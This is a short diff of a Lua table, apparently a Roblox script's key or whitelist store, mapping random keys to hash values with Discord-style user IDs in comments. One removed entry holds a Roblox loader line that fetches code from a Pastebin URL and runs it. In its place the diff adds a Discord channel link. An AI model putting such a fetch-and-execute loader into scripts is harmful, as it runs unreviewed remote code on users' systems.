@@ -134,7 +134,6 @@ local LifeTime = {
  ["LdDDUuBMvUoApkqWUYkSvfccsuWIIzPK"] = "31ff9c4aa3d165892e6afcb93d2cea13a9a24b27f520e86e05efcdaf7ada7e4d", -- 1339904235751604247
  ["c8htfavzyqyvxdd3czmdpjwbv76y4mdc"] = "68f53beae88a66f8d1286e47400532997d1674421dc36537a48a52b108e5d788", -- 1433539202833842219
  ["e9r7lolqdvlgizyx4x5dfni971ddoket"] = "45475d35bd3d7fed47cae3da23334c7788a2deab5f4d53", -- 1148063763463929906
- ["n1fu34qsp4qcqx0ksdpf0cna9wscqixi"] = "loadstring(game:HttpGet(https://
-pastebin.com/raw/h9JpYewK')) ()", -- 1208830607161827409
+ ["n1fu34qsp4qcqx0ksdpf0cna9wscqixi"] = "https://discord.com/channels/@me/1472529154875461697/1472534207736578201", -- 1208830607161827409
 }
 return LifeTime;
